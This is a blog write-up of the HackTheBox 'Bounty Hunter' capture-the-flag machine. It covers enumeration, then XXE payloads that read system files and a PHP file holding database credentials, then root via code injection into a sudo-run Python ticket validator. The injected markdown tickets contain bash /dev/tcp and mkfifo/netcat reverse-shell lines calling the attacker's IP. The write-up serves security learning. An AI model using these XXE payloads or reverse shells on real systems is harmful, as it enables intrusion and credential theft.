<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="nair0lf32 ">
<meta name="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLosZOXFZWvSPhPmfUE7v&#43;PjfXGErY0KCPmAWrTUkyyFWRFO3gwHQMQqQUIcuZHmH20xMb&#43;mNC6xnX2TRmsyaufPXLmib9Wn0BtEYbVDlu2mOdxWfr&#43;LIO8yvB&#43;kg2Uqg&#43;QHJf7SfTvdO606eBjF0uhTQ95wnJddm7WWVJlJMng7&#43;/1NuLAAzfc0ei14XtyS1u6gDvCzXPR5xus8vfJNSp4n4B5m4GUPqI7odyXG2jK89STkoI5MhDOtzbrQydR0ZUg2PRd5TplgpmapDzMBYCIxH6BwYXFgSU3u3dSxPJnIrbizFVNIbc9ezkF39K&#43;xJPbc9CTom8N59eiNubf63iDOck9yMH&#43;YGk8HQof8ovp9FAT7ao5dfeb8gH9q9mRnuMOOQ9SxYwIxdtgg6mIYh4PRqHaSD5FuTZmsFzPfdnvmurDWDqdjPZ6/CsWAkrzENv45b0F04DFiKYNLwk8xaXLum66w61jz4Lwpko58Hh&#43;m0i4bs25wTH1VDMkguJ1js=| 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKlGEKJHQ/zTuLAvcemSaOeKfnvOC4s1Qou1E0o9Z0gWONGE1cVvgk1VxryZn7A0L1htGGQqmFe50002LfPQfmY=| 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJeoMhM6lgQjk6hBf&#43;Lw/sWR4b1h8AEiDv&#43;HAbTNk4J380/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu))| http-methods:|_ Supported Methods: HEAD|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf assets [Status: 301, Size: 313, Words: 20, Lines: 10]." />
<meta name="keywords" content="hacking, cybersecurity, ctf, nair0lf32, zerone, zer0ne" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/writeups/hackthebox/bounty-hunter/bounty_hunter/" />


    <title>
        
            Bounty Hunter :: Zer0ne blog 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="http://localhost:1313/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">



    <link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
    <link rel="manifest" href="http://localhost:1313/site.webmanifest">
    <link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="http://localhost:1313/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="Bounty Hunter">
<meta itemprop="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLosZOXFZWvSPhPmfUE7v&#43;PjfXGErY0KCPmAWrTUkyyFWRFO3gwHQMQqQUIcuZHmH20xMb&#43;mNC6xnX2TRmsyaufPXLmib9Wn0BtEYbVDlu2mOdxWfr&#43;LIO8yvB&#43;kg2Uqg&#43;QHJf7SfTvdO606eBjF0uhTQ95wnJddm7WWVJlJMng7&#43;/1NuLAAzfc0ei14XtyS1u6gDvCzXPR5xus8vfJNSp4n4B5m4GUPqI7odyXG2jK89STkoI5MhDOtzbrQydR0ZUg2PRd5TplgpmapDzMBYCIxH6BwYXFgSU3u3dSxPJnIrbizFVNIbc9ezkF39K&#43;xJPbc9CTom8N59eiNubf63iDOck9yMH&#43;YGk8HQof8ovp9FAT7ao5dfeb8gH9q9mRnuMOOQ9SxYwIxdtgg6mIYh4PRqHaSD5FuTZmsFzPfdnvmurDWDqdjPZ6/CsWAkrzENv45b0F04DFiKYNLwk8xaXLum66w61jz4Lwpko58Hh&#43;m0i4bs25wTH1VDMkguJ1js=| 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKlGEKJHQ/zTuLAvcemSaOeKfnvOC4s1Qou1E0o9Z0gWONGE1cVvgk1VxryZn7A0L1htGGQqmFe50002LfPQfmY=| 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJeoMhM6lgQjk6hBf&#43;Lw/sWR4b1h8AEiDv&#43;HAbTNk4J380/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu))| http-methods:|_ Supported Methods: HEAD|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf assets [Status: 301, Size: 313, Words: 20, Lines: 10]."><meta itemprop="datePublished" content="2022-09-20T14:03:31+01:00" />
<meta itemprop="dateModified" content="2024-01-31T11:24:29+01:00" />
<meta itemprop="wordCount" content="991"><meta itemprop="image" content="http://localhost:1313/" />
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="http://localhost:1313/" /><meta name="twitter:title" content="Bounty Hunter"/>
<meta name="twitter:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLosZOXFZWvSPhPmfUE7v&#43;PjfXGErY0KCPmAWrTUkyyFWRFO3gwHQMQqQUIcuZHmH20xMb&#43;mNC6xnX2TRmsyaufPXLmib9Wn0BtEYbVDlu2mOdxWfr&#43;LIO8yvB&#43;kg2Uqg&#43;QHJf7SfTvdO606eBjF0uhTQ95wnJddm7WWVJlJMng7&#43;/1NuLAAzfc0ei14XtyS1u6gDvCzXPR5xus8vfJNSp4n4B5m4GUPqI7odyXG2jK89STkoI5MhDOtzbrQydR0ZUg2PRd5TplgpmapDzMBYCIxH6BwYXFgSU3u3dSxPJnIrbizFVNIbc9ezkF39K&#43;xJPbc9CTom8N59eiNubf63iDOck9yMH&#43;YGk8HQof8ovp9FAT7ao5dfeb8gH9q9mRnuMOOQ9SxYwIxdtgg6mIYh4PRqHaSD5FuTZmsFzPfdnvmurDWDqdjPZ6/CsWAkrzENv45b0F04DFiKYNLwk8xaXLum66w61jz4Lwpko58Hh&#43;m0i4bs25wTH1VDMkguJ1js=| 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKlGEKJHQ/zTuLAvcemSaOeKfnvOC4s1Qou1E0o9Z0gWONGE1cVvgk1VxryZn7A0L1htGGQqmFe50002LfPQfmY=| 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJeoMhM6lgQjk6hBf&#43;Lw/sWR4b1h8AEiDv&#43;HAbTNk4J380/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu))| http-methods:|_ Supported Methods: HEAD|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf assets [Status: 301, Size: 313, Words: 20, Lines: 10]."/>



    <meta property="og:title" content="Bounty Hunter" />
<meta property="og:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLosZOXFZWvSPhPmfUE7v&#43;PjfXGErY0KCPmAWrTUkyyFWRFO3gwHQMQqQUIcuZHmH20xMb&#43;mNC6xnX2TRmsyaufPXLmib9Wn0BtEYbVDlu2mOdxWfr&#43;LIO8yvB&#43;kg2Uqg&#43;QHJf7SfTvdO606eBjF0uhTQ95wnJddm7WWVJlJMng7&#43;/1NuLAAzfc0ei14XtyS1u6gDvCzXPR5xus8vfJNSp4n4B5m4GUPqI7odyXG2jK89STkoI5MhDOtzbrQydR0ZUg2PRd5TplgpmapDzMBYCIxH6BwYXFgSU3u3dSxPJnIrbizFVNIbc9ezkF39K&#43;xJPbc9CTom8N59eiNubf63iDOck9yMH&#43;YGk8HQof8ovp9FAT7ao5dfeb8gH9q9mRnuMOOQ9SxYwIxdtgg6mIYh4PRqHaSD5FuTZmsFzPfdnvmurDWDqdjPZ6/CsWAkrzENv45b0F04DFiKYNLwk8xaXLum66w61jz4Lwpko58Hh&#43;m0i4bs25wTH1VDMkguJ1js=| 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKlGEKJHQ/zTuLAvcemSaOeKfnvOC4s1Qou1E0o9Z0gWONGE1cVvgk1VxryZn7A0L1htGGQqmFe50002LfPQfmY=| 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJeoMhM6lgQjk6hBf&#43;Lw/sWR4b1h8AEiDv&#43;HAbTNk4J380/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu))| http-methods:|_ Supported Methods: HEAD|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf assets [Status: 301, Size: 313, Words: 20, Lines: 10]." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/writeups/hackthebox/bounty-hunter/bounty_hunter/" /><meta property="og:image" content="http://localhost:1313/" /><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2022-09-20T14:03:31+01:00" />
<meta property="article:modified_time" content="2024-01-31T11:24:29+01:00" />





    <meta property="article:section" content="HackTheBox" />



    <meta property="article:published_time" content="2022-09-20 14:03:31 &#43;0100 WAT" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="http://localhost:1313/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">#&gt;</span>
            <span class="logo__text">0/1</span>
            <span class="logo__cursor" style=
                  "
                   background-color:#0FF00D;
                   animation-duration:2s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="http://localhost:1313/about">About</a></li><li><a href="http://localhost:1313/posts">Blog</a></li><li><a href="http://localhost:1313/writeups">Writeups</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="http://localhost:1313/writeups/hackthebox/bounty-hunter/bounty_hunter/">Bounty Hunter</a></h2>

            
            
            

            <div class="post-content">
                <h2 id="enumeration">Enumeration</h2>
<h3 id="nmap">nmap</h3>
<pre tabindex="0"><code>PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLosZOXFZWvSPhPmfUE7v+PjfXGErY0KCPmAWrTUkyyFWRFO3gwHQMQqQUIcuZHmH20xMb+mNC6xnX2TRmsyaufPXLmib9Wn0BtEYbVDlu2mOdxWfr+LIO8yvB+kg2Uqg+QHJf7SfTvdO606eBjF0uhTQ95wnJddm7WWVJlJMng7+/1NuLAAzfc0ei14XtyS1u6gDvCzXPR5xus8vfJNSp4n4B5m4GUPqI7odyXG2jK89STkoI5MhDOtzbrQydR0ZUg2PRd5TplgpmapDzMBYCIxH6BwYXFgSU3u3dSxPJnIrbizFVNIbc9ezkF39K+xJPbc9CTom8N59eiNubf63iDOck9yMH+YGk8HQof8ovp9FAT7ao5dfeb8gH9q9mRnuMOOQ9SxYwIxdtgg6mIYh4PRqHaSD5FuTZmsFzPfdnvmurDWDqdjPZ6/CsWAkrzENv45b0F04DFiKYNLwk8xaXLum66w61jz4Lwpko58Hh+m0i4bs25wTH1VDMkguJ1js=
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKlGEKJHQ/zTuLAvcemSaOeKfnvOC4s1Qou1E0o9Z0gWONGE1cVvgk1VxryZn7A0L1htGGQqmFe50002LfPQfmY=
|   256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJeoMhM6lgQjk6hBf+Lw/sWR4b1h8AEiDv+HAbTNk4J3
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><h3 id="ffuf">ffuf</h3>
<pre tabindex="0"><code>        assets                  [Status: 301, Size: 313, Words: 20, Lines: 10]
        .htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
        .htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
        .hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
        [Status: 200, Size: 0, Words: 1, Lines: 1]
        css                     [Status: 301, Size: 310, Words: 20, Lines: 10]
        js                      [Status: 301, Size: 309, Words: 20, Lines: 10]
        index.php               [Status: 200, Size: 0, Words: 1, Lines: 1]
        resources               [Status: 301, Size: 316, Words: 20, Lines: 10]
        server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]

        //php pages
        .htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
        .hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
        .htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
        db                      [Status: 200, Size: 0, Words: 1, Lines: 1]
        portal                  [Status: 200, Size: 125, Words: 11, Lines: 6]
        index                   [Status: 200, Size: 0, Words: 1, Lines: 1]
</code></pre><p>ok enumeration was nothing special but I found a db.php page but the page was empty..might have some nterresting php</p>
<p>enum on website gave us a log_submit.php page from portal button</p>
<p>note to self: consider adding nikto to my enum tools</p>
<p>there is a php form to add bugs to a database</p>
<pre tabindex="0"><code>If DB were ready, would have added:
Title: title
CWE: CWE
Score: 0.0
Reward: 1
</code></pre><p>we captured the same request in burpsuite</p>
<p>POST request made to http://10.10.11.100/tracker_diRbPr00f314.php</p>
<p>with a parameter</p>
<pre tabindex="0"><code>data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT50aXRsZTwvdGl0bGU%2BCgkJPGN3ZT5DV0U8L2N3ZT4KCQk8Y3Zzcz4wLjA8L2N2c3M%2BCgkJPHJld2FyZD4xPC9yZXdhcmQ%2BCgkJPC9idWdyZXBvcnQ%2B
</code></pre><p>with decoder we see its xml format of our request (url decode + base64 decode)</p>
<pre tabindex="0"><code>&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;
&lt;bugreport&gt;
&lt;title&gt;title&lt;/title&gt;
&lt;cwe&gt;CWE&lt;/cwe&gt;
&lt;cvss&gt;0.0&lt;/cvss&gt;
&lt;reward&gt;1&lt;/reward&gt;
&lt;/bugreport&gt;
</code></pre><p>XML injection it is</p>
<p>our XXE payload model will be simple like this</p>
<p><code>&lt;!DOCTYPE data [ &lt;!ENTITY file SYSTEM &quot;file://{absolute file path}&quot;&gt; ]&gt;</code><br>
and <code>&amp;file;</code> where we want the output</p>
<p>So first test (make sure your xml is well-formatted! Used xmlgrid.net to check)</p>
<pre tabindex="0"><code>&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;
&lt;!DOCTYPE data [&lt;!ENTITY file SYSTEM &#34;file:///etc/hosts&#34;&gt;]&gt;
&lt;bugreport&gt;
&lt;title&gt;title&lt;/title&gt;
&lt;cwe&gt;CWE&lt;/cwe&gt;
&lt;cvss&gt;0.0&lt;/cvss&gt;
&lt;reward&gt;&amp;file;&lt;/reward&gt;
&lt;/bugreport&gt;
</code></pre><p>we base64 encode it then url encode and pass it to repeater <code>data=</code> parameter
And we get our output</p>
<pre tabindex="0"><code>127.0.0.1 localhost
127.0.1.1 bountyhunter

# The following lines are desirable for IPv6 capable hosts

::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</code></pre><p>Great success..now we can read more interresting files like /etc/passwd</p>
<pre tabindex="0"><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
\_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</code></pre><p>There is a <code>development</code> user but we can&rsquo;t read his .ssh/id_rsa key&hellip;lets try to read php files&hellip;/var/www/html/db.php</p>
<p>No output&hellip;but I could read another php file tracker_diRbPr00f314.php with no interresting output</p>
<p>It means the payload is not convenient to read this one&hellip;there must be a php filter&hellip;so we change payload model</p>
<p><code>&lt;!DOCTYPE data [ &lt;!ENTITY file SYSTEM &quot;php://filter/read=convert.base64-encode/resource={absolute file path}&quot;&gt; ]&gt;</code><br>
with <code>&amp;file;</code> for output</p>
<p>Now when applied</p>
<pre tabindex="0"><code>&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;
&lt;!DOCTYPE data [&lt;!ENTITY file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=/var/www/html/db.php&#34;&gt;]&gt;
&lt;bugreport&gt;
&lt;title&gt;title&lt;/title&gt;
&lt;cwe&gt;CWE&lt;/cwe&gt;
&lt;cvss&gt;0.0&lt;/cvss&gt;
&lt;reward&gt;&amp;file;&lt;/reward&gt;
&lt;/bugreport&gt;
</code></pre><p>We get our output</p>
<pre tabindex="0"><code>PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=
</code></pre><p>we decode it as base64</p>
<pre tabindex="0"><code>&lt;?php
// TODO -&gt; Implement login system with the database.
$dbserver = &#34;localhost&#34;;
$dbname = &#34;bounty&#34;;
$dbusername = &#34;admin&#34;;
$dbpassword = &#34;m19RoAU0hP41A1sTsq6K&#34;;
$testuser = &#34;test&#34;;
?&gt;
</code></pre><p>haha yes success database credentials that may also be used to ssh as development user (sql db way to explore)</p>
<p>First things first..USER FLAG
<code>development@bountyhunter:~$ cat user.txt</code></p>
<p>In the same folder we get <code>contract.txt</code>
<code>development@bountyhunter:~$ cat contract.txt</code></p>
<pre tabindex="0"><code>Hey team,

I&#39;ll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the &#34;rm -rf&#34; incident and we can&#39;t mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
</code></pre><p>And <code>dd.md</code></p>
<pre tabindex="0"><code># Skytrain Inc

## Ticket to

**Ticket Code:**
\*\*1404 + 10 == 1414 and **import**(&#39;os&#39;).system(&#34;bash -c &#39;exec bash -i &gt;&amp; /dev/tcp/10.10.14.13/4444 0&gt;&amp;1&#39;&#34;) == False
</code></pre><h2 id="priilege-escalation">Priilege escalation</h2>
<p>Good old&rsquo; privEsc ways
<code>sudo -l</code></p>
<pre tabindex="0"><code>Matching Defaults entries for development on bountyhunter:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
(root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
</code></pre><p>we can run ticketValidator as root uh? let&rsquo;s make that python script spawn a shell</p>
<p>copied the script in a python file to analyze it&hellip;it basically validate a markdown (.md) file with specific format
the dd.md file is an example that matches exactly a valid file and anything inserted correctlly after &ldquo;and&rdquo; would be executed as root:</p>
<p>we modify it to get us a shell on netcat 2311</p>
<pre tabindex="0"><code># Skytrain Inc

## Ticket to

**Ticket Code:**
\*\*102+ 10 == 112 and **import**(&#39;os&#39;).system(&#39;rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.178 2311 &gt;/tmp/h&#39;) == False
</code></pre><p>we prepare a server to send our <code>exploit.md</code> file</p>
<pre tabindex="0"><code>sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</code></pre><p>we get it in /tmp folder</p>
<pre tabindex="0"><code>development@bountyhunter:/tmp$ wget http://10.10.14.178/exploit.md
--2021-11-03 14:17:42-- http://10.10.14.178/exploit.md
Connecting to 10.10.14.178:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 185 [text/markdown]
Saving to: ‘exploit.md’

exploit.md 100%[========================================================================================================================================&gt;] 185 --.-KB/s in 0s

2021-11-03 14:17:42 (18.9 MB/s) - ‘exploit.md’ saved [185/185]
</code></pre><p>we execute the script</p>
<pre tabindex="0"><code>development@bountyhunter:/tmp$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
./exploit.md
Destination:
rm: cannot remove &#39;/tmp/h&#39;: No such file or directory
</code></pre><p>And we get a root shell on nc listener</p>
<pre tabindex="0"><code># id
uid=0(root) gid=0(root) groups=0(root)
</code></pre><p>Lets secure our victory</p>
<p><code># cat root.txt</code></p>
<p>Now its free real estate</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="http://localhost:1313/categories/hackthebox/">HackTheBox</a></span>
        
    </p>

			    <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"></circle><line x1="1.05" y1="12" x2="7" y2="12"></line><line x1="17.01" y1="12" x2="22.96" y2="12"></line></svg><a href="https://github.com/nair0lf32/zer0ne-blog3ea6cd49a6d64f0d2ae78ea0154477712891a42e" target="_blank" rel="noopener">3ea6cd4</a> @ 2024-01-31</p>
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2024</span>
            <span><a href="http://localhost:1313/">nair0lf32</a></span>
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span><a href="http://localhost:1313/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="http://localhost:1313/bundle.min.b1dc444a7108174ae3d2294f982be5e99e844ae2b8d58eeea19d929bde0338be4d12ed8a4dfc67194dcc6726fa6a82705119c0d7e4edd4de9294be6535ea7b7f.js" integrity="sha512-sdxESnEIF0rj0ilPmCvl6Z6ESuK41Y7uoZ2Sm94DOL5NEu2KTfxnGU3MZyb6aoJwURnA1&#43;Tt1N6SlL5lNep7fw=="></script>



    </body>
</html>
